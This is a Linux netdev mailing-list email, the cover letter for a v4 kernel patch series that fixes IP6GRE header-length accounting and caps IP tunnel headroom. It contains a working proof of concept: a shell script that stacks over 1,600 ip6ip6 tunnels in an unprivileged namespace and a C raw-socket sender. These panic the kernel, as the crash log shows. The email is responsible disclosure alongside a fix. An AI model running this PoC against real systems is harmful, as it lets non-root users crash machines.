Received: from mail-pj1-f41.google.com (mail-pj1-f41.google.com [209.85.216.41])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 0C8612C15A5
	for <netdev@vger.kernel.org>; Wed, 12 Aug 2026 16:22:50 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.41
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1786551772; cv=none; b=mITUKgyaDRTF0K7nkPRSxt75EoY5K4cgM5uphlVPsJy6SepEirbm37nOVlEYMKLJQGqWhhsOgEYKIGFi2s3GBPlX+aO6hhq7avd+OeNoPvX01aPoqD/FBfCTuaE/TwbBEP+iuJBUSDF/LvOlCQXtTL3OE5WLDBVRxkn2kXGZ8zg=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1786551772; c=relaxed/simple;
	bh=lrDZ5TI73A1nZceL7IhzZOo8lYHdF4F4SeRdX3UN6Kg=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=D04iwqK71rM7RdH1M8MTkjt+DJ0howmj2YzhHPrifp57MK5Zkb2Cqws1jsf1Uy/myletXc0pBJygsNDAs0E8pMRHVHpzahoBmpVUUDrrtPsNFAqurxE1QFPdapWSttElcu4H0ucXBZrmpovH1c4nl/EXHJ2tlVrPFrKJy55Dmi8=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=d/cDmAKp; arc=none smtp.client-ip=209.85.216.41
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="d/cDmAKp"
Received: by mail-pj1-f41.google.com with SMTP id 98e67ed59e1d1-38f620399a0so1168082a91.2
        for <netdev@vger.kernel.org>; Wed, 12 Aug 2026 09:22:50 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1786551770; x=1787156570; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=lX4Eyyyse79Ya6Zwj8E8euBE2SlTH6l+NqnsZ4QmLkY=;
        b=d/cDmAKpf8LMCmnsOezZSzgis8WowL04XXCZgGlOCQGLeQnuKXhxleQxwDWmlWdFuC
         fUjV/2HhgET67Azlml4wkpBKpuMGA9f99nGhgz/fc+m/u6IAz4q/7tGrtN4ec8qMGvRd
         1VDAMOhbmCcBjn4eOWQT1WP/kPuX6x2LL8yXuAlMX4z8guKFkId+esqyQgs6CEgmroYP
         wgN4ZyDRDUSZUBIzUKtV2SZ9PDrv8BOOfyqQLIijNCfL3+ODcTkzr2DtXc9VfI1PibYQ
         JIOwkfUCmkLA7AVjYo4Q5TCK/o+duvZp91sPaoU0ImeiBRfaUCHj3pGPAlGv9h4zyZKE
         Tdnw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1786551770; x=1787156570;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=lX4Eyyyse79Ya6Zwj8E8euBE2SlTH6l+NqnsZ4QmLkY=;
        b=DBRQ3Zs5ZUxomS3j+FKetLJw9NnKZnlld/kWoWN2l3xIS0FR0EHdf+uMDh3Y1xErUL
         4Rcyj/SYpVDV6MpgxxO54mcWmDmFyYcWu0H+qEqFV+7bOSSqVmj3vJ9DhWNT3TwQ3mwC
         qym3R7/I9Rgfpt7dtroNr+H4UiCHlIUTPj3ch5MY2AaxdQnCfZFxEHHjxSqf7W+6wjqB
         E9w1exqZoae4DySfPvp+fBzMWpE3cftnNZqF3gzpK1G3eV6406u0Tg+c/pZW3nR/MmoQ
         3i/x4Js7Jpxig6i7yQMBY4F3Vbw9kOksuAJyhqqrIV7bAE0xM/b0ccvh42Uc407Ypzws
         7IEw==
X-Forwarded-Encrypted: i=1; AHgh+RqdsQTw6Jz8X2utOp2V78G/c3y9ynISDWJd9uEYYb8LfT40VuhI3o3WDtrDYkV/egAzLkyCAxU=@vger.kernel.org
X-Gm-Message-State: AOJu0YzolbRRWlkvBJm6bgtTjY9oDVgwn7EP+j8KuerCdlvB0lc7NaWy
	+Y5YVSonxUe8vaf5MUwcjxALy+ITDOoShuIdHgXV4bHCgTid9WjOBzjrx95Nzf0h9fWb
X-Gm-Gg: AR+sD10U6OXqfzo3UdM5dNsA+S/12xFvsIwK5G8SnZMUpL0ICm+409IiOkptWG31s9c
	6vwZOmygypgAyFijrVcmcGufrlz4EWCwx6190QJje6KjPzSganT7kLiOAWTS60BEfOXsJ2rq2qj
	T+BlU82IdtlJmfGMViiTbSpJrP3o2GR3dy+GH/lUGY5mtvtIB72HJ4fH7qrPnyn47rbKTCkQ9r8
	LNEnDaW8TilQA3+1mT5A1A5Ouohop2ReMYrvet4/qLNhgm4ZKQTuZIlv8oItGn0JViV9rL4sK2Y
	ttrNzieEOohkJWxvEMnEXRnZ53fJjrvE22HBFzjY4u/vKgKQYiQ+zTngRdqgLSMI62+CT33iRvb
	iJ22/zm/Gp3KpCKkDXM9Z240csGklmtwYHQZqZZwyK/teDalHm3rk/NTs1F8eel183s+J9zoeLc
	2NNmgWAvOV31iECRqeYSftHWE6YP1qHBykWXMHXyLX5WCMPR4H6U1AHw5DOdwCRtJKv5YiWKNL1
	dBt
X-Received: by 2002:a17:90b:17cd:b0:392:c80b:8ef7 with SMTP id 98e67ed59e1d1-3930144d6a6mr6708291a91.18.1786551770126;
        Wed, 12 Aug 2026 09:22:50 -0700 (PDT)
Received: from Roxy.localdomain ([203.175.14.54])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-392fe44ebecsm1466974a91.2.2026.08.12.09.22.43
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 12 Aug 2026 09:22:48 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: idosch@nvidia.com,
	netdev@vger.kernel.org
Cc: dsahern@kernel.org,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	atenart@kernel.org,
	yuehaibing@huawei.com,
	kuniyu@google.com,
	kees@kernel.org,
	kylebot@openai.com,
	thorsten.blum@linux.dev,
	maoyixie.tju@gmail.com,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net v4 0/2] net: fix IP6GRE header length before capping tunnel headroom
Date: Thu, 13 Aug 2026 00:22:33 +0800
Message-ID: <cover.1786542637.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.43.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in IP tunnel headroom accounting. The bug is
reachable by a non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

IP tunnel devices derive advertised headroom from lower output devices. A
namespace-local stack of tunnel devices can make that advertised reservation
larger than the 16-bit skb header offsets can represent. Once IP output
reserves that space and records network or transport header offsets, later skb
head expansion can wrap those offsets and leave header helpers pointing into
headroom instead of the packet area.

For IP6GRE, there is an earlier accounting bug that has to be fixed first:
ip6gre_tnl_link_config_route() folds the lower device's hard_header_len into
the tunnel device's hard_header_len whenever header_ops is set. That is wrong
for both header_ops users. ip6gretap and ip6erspan have a fixed Ethernet
hardware header length, while an NBMA ip6gre tunnel's header_ops creates only
the tunnel header: GRE, optional FOU or GUE, and the outer IPv6 header. The
lower device header is needed headroom, not part of the tunnel device's
hardware header.

This series first fixes that IP6GRE hardware-header accounting, then caps the
advertised IP tunnel needed_headroom at the same 512-byte limit already used
by the runtime tunnel transmit path. Tunnel transmit can still expand the skb
when a packet needs more headroom, so nonsensical stacked configurations may
pay an extra reallocation but cannot publish an unbounded reservation to upper
layers.

Reproducer:

    make
    unshare -Urn ./poc.sh

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------

#!/bin/bash
set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
	echo "run as root or inside 'unshare -Urn'" >&2
	exit 1
fi

DIR="$(cd "$(dirname "$0")" && pwd)"

sysctl -qw net.ipv6.conf.all.accept_dad=0
sysctl -qw net.ipv6.conf.default.accept_dad=0
sysctl -qw net.ipv6.conf.all.router_solicitations=0
sysctl -qw net.ipv6.conf.default.router_solicitations=0
sysctl -qw net.ipv6.conf.all.accept_ra=0
sysctl -qw net.ipv6.conf.default.accept_ra=0
sysctl -qw net.ipv6.conf.all.autoconf=0
sysctl -qw net.ipv6.conf.default.autoconf=0

ip link add x0 type veth peer name x1
ip link set x0 up
ip link set x1 up
ip -6 addr add fd40::1/64 dev x0 nodad
ip -6 addr add fd40::2/64 dev x1 nodad

prev=x0
for i in $(seq 0 1637); do
	name="w$i"
	subnet="$(printf '%x' "$i")"
	next="$(printf '%x' "$((i + 1))")"
	ip link add "$name" type ip6tnl mode ip6ip6 \
		local "fd40:${subnet}::1" remote "fd40:${subnet}::2" \
		dev "$prev" encaplimit none
	ip link set "$name" up
	ip -6 addr add "fd40:${next}::1/64" dev "$name" nodad
	prev="$name"
	if (( (i + 1) % 400 == 0 )); then
		echo "built $((i + 1)) / 1638 tunnels" >&2
	fi
done

exec "$DIR/poc" w1637 fd40:666::1 fd40:666::2 160

------END poc.sh--------

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <net/if.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

struct ipv6_hdr_raw {
	uint32_t vtc_flow;
	uint16_t payload_len;
	uint8_t nexthdr;
	uint8_t hop_limit;
	struct in6_addr saddr;
	struct in6_addr daddr;
} __attribute__((packed));

static void die(const char *msg)
{
	perror(msg);
	exit(1);
}

int main(int argc, char **argv)
{
	const char *ifname;
	const char *src_str;
	const char *dst_str;
	struct sockaddr_in6 dst = { 0 };
	struct ipv6_hdr_raw *hdr;
	unsigned char *packet;
	int sock;
	int hdrincl = 1;
	size_t payload_len = 160;
	size_t packet_len;
	ssize_t sent;

	if (argc < 4 || argc > 5) {
		fprintf(stderr, "usage: %s <ifname> <src> <dst> [payload_len]\n", argv[0]);
		return 1;
	}

	ifname = argv[1];
	src_str = argv[2];
	dst_str = argv[3];

	if (argc == 5) {
		char *end = NULL;
		unsigned long tmp = strtoul(argv[4], &end, 0);

		if (!end || *end != '\0' || tmp > 1200) {
			fprintf(stderr, "invalid payload_len: %s\n", argv[4]);
			return 1;
		}
		payload_len = tmp;
	}

	packet_len = sizeof(*hdr) + payload_len;
	packet = calloc(1, packet_len);
	if (!packet)
		die("calloc");

	hdr = (struct ipv6_hdr_raw *)packet;
	hdr->vtc_flow = htonl(6u << 28);
	hdr->payload_len = htons((uint16_t)payload_len);
	hdr->nexthdr = 59;
	hdr->hop_limit = 64;

	if (inet_pton(AF_INET6, src_str, &hdr->saddr) != 1) {
		fprintf(stderr, "invalid source IPv6 address: %s\n", src_str);
		return 1;
	}
	if (inet_pton(AF_INET6, dst_str, &hdr->daddr) != 1) {
		fprintf(stderr, "invalid destination IPv6 address: %s\n", dst_str);
		return 1;
	}

	for (size_t i = 0; i < payload_len; i++)
		packet[sizeof(*hdr) + i] = (unsigned char)i;

	sock = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
	if (sock < 0)
		die("socket(AF_INET6, SOCK_RAW, IPPROTO_RAW)");

	if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, ifname, strlen(ifname) + 1) < 0)
		die("setsockopt(SO_BINDTODEVICE)");

	if (setsockopt(sock, IPPROTO_IPV6, IPV6_HDRINCL, &hdrincl, sizeof(hdrincl)) < 0)
		die("setsockopt(IPV6_HDRINCL)");

	dst.sin6_family = AF_INET6;
	if (inet_pton(AF_INET6, dst_str, &dst.sin6_addr) != 1) {
		fprintf(stderr, "invalid destination IPv6 address: %s\n", dst_str);
		return 1;
	}

	sent = sendto(sock, packet, packet_len, 0, (struct sockaddr *)&dst, sizeof(dst));
	if (sent < 0)
		die("sendto");

	printf("sent %zd bytes via %s\n", sent, ifname);
	close(sock);
	free(packet);
	return 0;
}

------END poc.c--------

----BEGIN crash log----

[  234.045915] BUG: unable to handle page fault for address: ffff88821e640006
[  234.047065] #PF: supervisor read access in kernel mode
[  234.047877] #PF: error_code(0x0000) - not-present page
[  234.048721] PGD 5a01067 P4D 5a01067 PUD 0
[  234.049389] Oops: Oops: 0000 [#1] SMP NOPTI
[  234.050125] CPU: 2 UID: 1028 PID: 9206 Comm: python3 Not tainted 6.12.95 #1
[  234.051234] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  234.053041] RIP: 0010:__skb_flow_dissect (/home/roxy/linux-block-patch/build/../include/linux/rcupdate.h:867 /home/roxy/linux-block-patch/build/../net/core/flow_dissector.c:1172)
[  234.053865] Code: 00 00 00 00 00 48 c7 84 24 a0 00 00 00 00 00 00 00 83 f8 27 0f 8e 9a 0a 00 00 49 63 c6 4c 01 c0 0f 84 7f 01 00 00 49 8b 14 24 <44> 0f b6 48 06 f6 c2 08 74 3c 41 0f b7 54 24 0e 48 8b 48 08 41 bd
All code
========
   0:	00 00                	add    %al,(%rax)
   2:	00 00                	add    %al,(%rax)
   4:	00 48 c7             	add    %cl,-0x39(%rax)
   7:	84 24 a0             	test   %ah,(%rax,%riz,4)
   a:	00 00                	add    %al,(%rax)
   c:	00 00                	add    %al,(%rax)
   e:	00 00                	add    %al,(%rax)
  10:	00 83 f8 27 0f 8e    	add    %al,-0x71f0d808(%rbx)
  16:	9a                   	(bad)
  17:	0a 00                	or     (%rax),%al
  19:	00 49 63             	add    %cl,0x63(%rcx)
  1c:	c6                   	(bad)
  1d:	4c 01 c0             	add    %r8,%rax
  20:	0f 84 7f 01 00 00    	je     0x1a5
  26:	49 8b 14 24          	mov    (%r12),%rdx
  2a:*	44 0f b6 48 06       	movzbl 0x6(%rax),%r9d		<-- trapping instruction
  2f:	f6 c2 08             	test   $0x8,%dl
  32:	74 3c                	je     0x70
  34:	41 0f b7 54 24 0e    	movzwl 0xe(%r12),%edx
  3a:	48 8b 48 08          	mov    0x8(%rax),%rcx
  3e:	41                   	rex.B
  3f:	bd                   	.byte 0xbd

Code starting with the faulting instruction
===========================================
   0:	44 0f b6 48 06       	movzbl 0x6(%rax),%r9d
   5:	f6 c2 08             	test   $0x8,%dl
   8:	74 3c                	je     0x46
   a:	41 0f b7 54 24 0e    	movzwl 0xe(%r12),%edx
  10:	48 8b 48 08          	mov    0x8(%rax),%rcx
  14:	41                   	rex.B
  15:	bd                   	.byte 0xbd
[  234.056808] RSP: 0018:ffffc9000aac75a0 EFLAGS: 00010286
[  234.057649] RAX: ffff88821e640000 RBX: ffff8881055201c0 RCX: ffffc9000aac76cc
[  234.058844] RDX: 000000000020105f RSI: 0000000000000000 RDI: 0000000000000000
[  234.059977] RBP: ffffc9000aac76a0 R08: ffff88821e640000 R09: 0000000000000000
[  234.061118] R10: 000000000000dd86 R11: ffffc9000aac76cc R12: ffffffff83966000
[  234.062255] R13: ffffc9000aac7620 R14: 0000000000000000 R15: 0000000000000000
[  234.063403] FS:  00007e28f9bbd780(0000) GS:ffff88813bd00000(0000) knlGS:0000000000000000
[  234.064686] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  234.065606] CR2: ffff88821e640006 CR3: 000000011e52a002 CR4: 0000000000770ef0
[  234.066745] PKRU: 55555554
[  234.067214] Call Trace:
[  234.067617]  <TASK>
[  234.070979]  __xfrm_decode_session (/home/roxy/linux-block-patch/build/../net/xfrm/xfrm_policy.c:3504)
[  234.071688]  icmpv6_route_lookup (/home/roxy/linux-block-patch/build/../include/net/ip6_route.h:285 /home/roxy/linux-block-patch/build/../net/ipv6/icmp.c:372)
[  234.072397]  icmp6_send (/home/roxy/linux-block-patch/build/../net/ipv6/icmp.c:686 (discriminator 1))
[  234.073647]  icmpv6_ndo_send (/home/roxy/linux-block-patch/build/../net/ipv6/ip6_icmp.c:16)
[  234.074296]  ip6_tnl_start_xmit (/home/roxy/linux-block-patch/build/../net/ipv6/ip6_tunnel.c:1440)
[  234.074981]  dev_hard_start_xmit (/home/roxy/linux-block-patch/build/../include/linux/netdevice.h:4835 /home/roxy/linux-block-patch/build/../include/linux/netdevice.h:5379 /home/roxy/linux-block-patch/build/../include/linux/netdevice.h:5371 /home/roxy/linux-block-patch/build/../net/core/dev.c:3888 /home/roxy/linux-block-patch/build/../net/core/dev.c:3904)
[  234.075660]  __dev_queue_xmit (/home/roxy/linux-block-patch/build/../include/linux/netfilter_netdev.h:137 /home/roxy/linux-block-patch/build/../net/core/dev.c:4806)
[  234.080901]  ip6_finish_output2 (/home/roxy/linux-block-patch/build/../include/net/ipv6.h:738 /home/roxy/linux-block-patch/build/../net/ipv6/ip6_output.c:83)
[  234.083021]  ip6_finish_output (/home/roxy/linux-block-patch/build/../include/net/dst.h:582 (discriminator 2) /home/roxy/linux-block-patch/build/../net/ipv6/ip6_output.c:235 (discriminator 2))
[  234.083699]  rawv6_sendmsg (/home/roxy/linux-block-patch/build/../net/ipv6/raw.c:908)
[  234.086335]  __sys_sendto (/home/roxy/linux-block-patch/build/../net/socket.c:2258)
[  234.086841]  __x64_sys_sendto (/home/roxy/linux-block-patch/build/../net/socket.c:2268)
[  234.087453]  do_syscall_64 (/home/roxy/linux-block-patch/build/../include/linux/sched/task_stack.h:23 /home/roxy/linux-block-patch/build/../arch/x86/include/asm/entry-common.h:43 /home/roxy/linux-block-patch/build/../include/linux/irq-entry-common.h:100 /home/roxy/linux-block-patch/build/../include/linux/entry-common.h:174 /home/roxy/linux-block-patch/build/../arch/x86/entry/syscall_64.c:89)
[  234.088057]  entry_SYSCALL_64_after_hwframe (/home/roxy/linux-block-patch/build/../arch/x86/entry/entry_64.S:121)
[  234.088865] RIP: 0033:0x7e28f9c51687
[  234.092398] RSP: 002b:00007ffeda544450 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[  234.093617] RAX: ffffffffffffffda RBX: 00007e28f9bbd780 RCX: 00007e28f9c51687
[  234.094763] RDX: 00000000000000c8 RSI: 00007e28f96489b0 RDI: 0000000000000003
[  234.096853] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000000
[  234.099484] CR2: ffff88821e640006
[  234.099936] ---[ end trace 0000000000000000 ]---
[  234.111918] Kernel panic - not syncing: Fatal exception in interrupt

-----END crash log-----

Best regards,
Zhiling Zou

changes in v4:
- Add a prerequisite IP6GRE patch that fixes hard_header_len accounting before
  capping tunnel headroom, as requested by Ido.
- Keep lower device headers in needed_headroom for IP6GRE and leave the fixed
  Ethernet hard_header_len unchanged for ip6gretap and ip6erspan.
- Apply the advertised headroom cap after the IP6GRE accounting fix.
- v3 Link: https://lore.kernel.org/all/0ac01576f92412e8fa35cc3eb44336797a9d11d0.1786021595.git.zhilinz@nebusec.ai/

changes in v3:
- Split netkit handling into a separate follow-up.
- Explain why capping advertised headroom is safe.
- Use local variables for derived headroom.
- v2 Link: https://lore.kernel.org/all/0ae4aa29223b89049727aec4d36f144bad41537e.1785476387.git.zhilinz@nebusec.ai/

changes in v2:
- Move the fix from IP send paths to tunnel and netkit device control paths.
- Cap advertised IP tunnel headroom at 512 and reject netkit headroom
  values above that limit at device creation.
- v1 Link: https://lore.kernel.org/all/0c6c64e9bbd71a0decc8504a384061e0e631be13.1785054561.git.zhilinz@nebusec.ai/

Zhiling Zou (2):
  ip6_gre: fix hardware header length for NBMA tunnels
  net: cap advertised IP tunnel headroom

 include/net/ip_tunnels.h | 11 +++++++++--
 net/ipv4/ip_tunnel.c     |  2 +-
 net/ipv6/ip6_gre.c       | 14 ++++++--------
 net/ipv6/ip6_tunnel.c    |  7 +++++--
 net/ipv6/sit.c           |  2 +-
 5 files changed, 22 insertions(+), 14 deletions(-)

-- 
2.43.0

